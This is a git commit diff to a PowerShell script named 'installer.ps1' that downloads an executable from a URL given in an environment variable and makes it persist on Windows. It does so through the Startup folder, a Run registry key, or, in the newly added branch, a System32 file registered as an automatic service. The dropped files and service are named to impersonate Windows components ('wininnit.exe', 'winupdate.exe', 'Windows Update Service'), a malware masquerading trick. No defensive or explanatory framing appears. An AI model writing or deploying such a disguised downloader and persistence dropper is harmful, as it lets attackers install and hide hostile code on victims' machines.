17868917de5b3282470a997d59912355eecba4cf
sushimampfer <sushimampfer@duck.com>
2025-07-26 19:34:10 +0200

    test

--- submissions/installer/installer.ps1
+++ submissions/installer/installer.ps1
@@ -2,17 +2,27 @@ switch ( $env:method )
 {
     1 {
         $dest = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\wininnit.exe"
-        Invoke-RestMethod -Uri $env:url -Headers @{"Cache-Control"="no-cache"} -OutFile $dest
+        Invoke-RestMethod -Uri $env:url -DisableKeepAlive -OutFile $dest
     }
     2 {
         $dest = Join-Path $env:APPDATA "wininnit.exe"
-        Invoke-RestMethod -Uri $env:url -Headers @{"Cache-Control"="no-cache"} -OutFile $dest
-        $newItemPropertySplat = @{
+        Invoke-RestMethod -Uri $env:url -DisableKeepAlive -OutFile $dest
+        $params = @{
             Path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
             Name = 'wininit'
             PropertyType = 'String'
             Value = $dest
         }
-        New-ItemProperty @newItemPropertySplat
+        New-ItemProperty @params
+    }
+    3 {
+        $dest = "C:\Windows\System32\winupdate.exe"
+        Invoke-RestMethod -Uri $env:url -DisableKeepAlive -OutFile $dest
+        $params = @{
+            BinaryPathName = 'C:\Windows\System32\winupdate.exe'
+            Name = 'Windows Update Service'
+            StartupType = 'Automatic'
+        }
+        New-Service @params
     }
 }
